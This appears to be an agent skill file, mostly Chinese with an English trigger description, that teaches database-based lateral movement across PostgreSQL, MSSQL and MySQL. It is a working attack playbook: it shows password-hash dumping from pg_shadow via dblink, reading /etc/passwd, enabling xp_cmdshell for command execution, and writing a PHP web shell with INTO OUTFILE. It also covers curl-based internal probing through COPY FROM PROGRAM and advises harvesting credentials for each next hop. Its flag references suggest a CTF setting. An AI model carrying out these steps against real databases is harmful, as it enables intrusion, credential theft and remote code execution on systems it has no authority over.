---
name: database-lateral-pivot
description: 数据库横向移动与跨库攻击。Use when you hold database access (PostgreSQL/MySQL/MSSQL) on one host and need to reach other DBs or internal services. Databases are natural pivots — they usually have looser network egress than the app server, and PostgreSQL dblink / MSSQL Linked Server / MySQL FEDERATED offer native cross-host query. When app-layer isolation is strict, the DB is often the only way to reach the next hop.
---

# 数据库横向移动

## 1. 先评估横向条件

```sql
-- PostgreSQL: 可用扩展 + 已有的外部连接
SELECT * FROM pg_available_extensions WHERE name IN ('dblink','postgres_fdw');
SELECT * FROM pg_foreign_server; SELECT * FROM pg_user_mapping;
-- MSSQL: 已配置的 Linked Server
EXEC sp_linkedservers;
-- MySQL: FEDERATED 引擎是否可用
SHOW ENGINES;   -- 看 FEDERATED 是否 YES
```

## 2. PostgreSQL — dblink / postgres_fdw 跨库

```sql
CREATE EXTENSION dblink;
-- 查询内网另一台 PG(已知/爆破的凭据)
SELECT * FROM dblink('host=INTERNAL_IP port=5432 dbname=postgres user=postgres password=PASS',
  'SELECT usename,passwd FROM pg_shadow') AS t(usename text, passwd text);
-- 无密码回显时用盲注式读文件
SELECT dblink_connect('host=INTERNAL_IP ...');
-- COPY 读文件(本地)
CREATE TABLE x(t text); COPY x FROM '/etc/passwd'; SELECT * FROM x;
```

## 3. MSSQL — Linked Server / OPENROWSET

```sql
-- 已有 linked server: 通过它查询内网
SELECT * FROM OPENQUERY([LinkedSrv], 'SELECT @@version');
-- xp_cmdshell 开 RCE(若启用)
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
-- 任意文件读
EXEC xp_cmdshell 'type C:\flag*';
```

## 4. MySQL — FEDERATED 跨库 + 读文件

```sql
-- FEDERATED 表:指向内网另一台 MySQL 的表,查询即跨主机
CREATE TABLE fed (id INT, val VARCHAR(255))
  ENGINE=FEDERATED CONNECTION='mysql://user:pass@INTERNAL_IP:3306/db/table';
SELECT * FROM fed;
-- 读文件 / 写文件(需 FILE 权限)
SELECT LOAD_FILE('/etc/passwd');
SELECT ... INTO OUTFILE '/var/www/html/shell.php';
```

## 5. 数据库 → SSRF → 内网探测

数据库自身的内建功能可当 SSRF 用(比应用层 SSRF 更强,因为 DB 通常直达内网):
- PostgreSQL: `COPY ... FROM PROGRAM 'curl http://INTERNAL:PORT/'`(若 superuser)
- MSSQL: `EXEC xp_cmdshell 'curl http://INTERNAL:PORT/'`
- MySQL: `LOAD_FILE` 读本地 / UDF 提权后执行命令
- 用这些探测内网存活主机和服务端口,再决定下一跳

## 6. 纪律

- 拿到 DB 凭据后**先看有没有 dblink/linked server/fdw 现成配置**——内网拓扑常写在里面(host+user+pass 明文)。
- DB 是跳板也是宝藏:读 `pg_shadow`/`mysql.user`/系统表拿更多凭据,读文件拿 flag 和配置。
- DB 出网探测用内建命令(COPY PROGRAM/xp_cmdshell/LOAD_FILE),比另起隧道快。
- 每发现一个内网 DB 地址,记录凭据,供下一跳横向。
